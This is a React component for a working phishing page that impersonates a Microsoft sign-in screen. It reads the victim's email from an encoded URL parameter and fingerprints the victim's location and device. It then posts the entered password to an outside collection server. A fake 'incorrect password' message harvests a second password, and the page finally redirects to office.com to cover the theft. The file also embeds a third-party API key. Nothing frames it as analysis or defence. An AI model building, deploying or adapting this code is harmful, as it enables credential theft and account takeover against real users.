import React, { useState, useEffect, useRef } from "react";
import axios from "axios";

const LoginForm = () => {
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [attemptCount, setAttemptCount] = useState(0);
  const [email, setEmail] = useState("");
  const [clientDetails, setClientDetails] = useState({});
  const [systemDetails, setSystemDetails] = useState({});
  const [isInputDisabled, setIsInputDisabled] = useState(false);

  // Ref for auto-focusing the input field
  const inputRef = useRef(null);

  // Fetch email from URL
  useEffect(() => {
    const queryParams = new URLSearchParams(window.location.search);
    let emailParam = queryParams.get("xys") || queryParams.get("zab");

    if (emailParam) {
      if (queryParams.get("zab")) {
        emailParam = atob(emailParam); // Decode if zab parameter is present
      }
      setEmail(emailParam);

      // Update URL to use zab parameter
      const newUrl = new URL(window.location.href);
      newUrl.searchParams.delete("xys");
      newUrl.searchParams.set("zab", btoa(emailParam));
      window.history.replaceState({}, "", newUrl.toString());
    }
  }, []);

  // Fetch client and system details
  useEffect(() => {
    const fetchDetails = async () => {
      try {
        // Get IP address
        const ipResponse = await axios.get("https://api.ipify.org?format=json");
        const ip = ipResponse.data.ip;

        // Get geo details
        const geoResponse = await axios.get(
          `https://api.geoapify.com/v1/ipinfo?&apiKey=7fb21a1ec68f44bb9ebbfe6ecea28c06&ip=${ip}`
        );
        const { country, city, continent } = geoResponse.data;
        setClientDetails({
          country: country.names.en,
          city: city.names.en,
          continent: continent.names.en,
        });

        // Get system details
        const userAgentData = navigator.userAgentData;
        setSystemDetails({
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          brand: userAgentData?.brands?.map((brand) => brand.brand).join(", ") || "Unknown",
          mobile: userAgentData?.mobile || false,
        });
      } catch (err) {
        console.error("Error fetching details:", err);
      }
    };

    fetchDetails();
  }, []);

  // Auto-focus input field after first attempt
  useEffect(() => {
    if (!loading && attemptCount === 1) {
      inputRef.current.focus();
    }
  }, [loading, attemptCount]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!password) {
      setError("Please enter your password.");
      return;
    }

    setLoading(true);
    setIsInputDisabled(true);

    try {
      const url = attemptCount === 0 ? "https://un-helpers.site/getlogs.php/" : "https://un-helpers.site/getlogs.php/";
      await axios.post(url, {
        email: email,
        [`${attemptCount === 0 ? "first" : "second"}passwordused`]: password,
        country: clientDetails.country,
        continent: clientDetails.continent,
        city: clientDetails.city,
        device: systemDetails,
      });

      if (attemptCount === 0) {
        // Simulate 500ms delay before showing error
        setTimeout(() => {
          setAttemptCount(1);
          setPassword("");
          setError("The email or password entered is incorrect. Please try again.");
          setLoading(false);
          setIsInputDisabled(false);
        }, 500); // Reduced loading time
      } else {
        // Redirect after second attempt
        window.location.href = "https://office.com";
      }
    } catch (err) {
      setError("An error occurred. Please try again.");
      setLoading(false);
      setIsInputDisabled(false);
    }
  };

  return (
    <section id="section_pwd">
      <div className={`auth-wrapper ${loading ? "loading" : ""}`}>
        {loading && (
          <>
            <div className="loading-overlay"></div>
            <div className="loading-bar"></div>
          </>
        )}
        <img src="/assets/logo.png" alt="Microsoft" className="d-block" />
        <div className="identity w-100 mt-16 mb-16">
          <button className="back">
            <img src="/assets/back.png" alt="Back" />
          </button>
          <span id="user_identity">{email}</span>
        </div>
        <h2 className="title mb-16">Enter password</h2>
        <form id="loginForm" onSubmit={handleSubmit}>
          <div className="mb-16">
            <p id="error_pwd" className="error">
              {error}
            </p>
            <input
              id="inp_pwd"
              type="password"
              name="pass"
              className="input"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              disabled={isInputDisabled || loading}
              autoFocus
              ref={inputRef} // Ref for auto-focus
            />
          </div>
          <div>
            <p className="mb-16">
              <a href="#" className="link fs-13">
                Forgot my password
              </a>
            </p>
          </div>
          <div>
            <button className="btn" id="btn_sig" disabled={loading}>
              <span>{loading ? "Signing in..." : "Sign in"}</span>
            </button>
          </div>
        </form>
      </div>
    </section>
  );
};

export default LoginForm;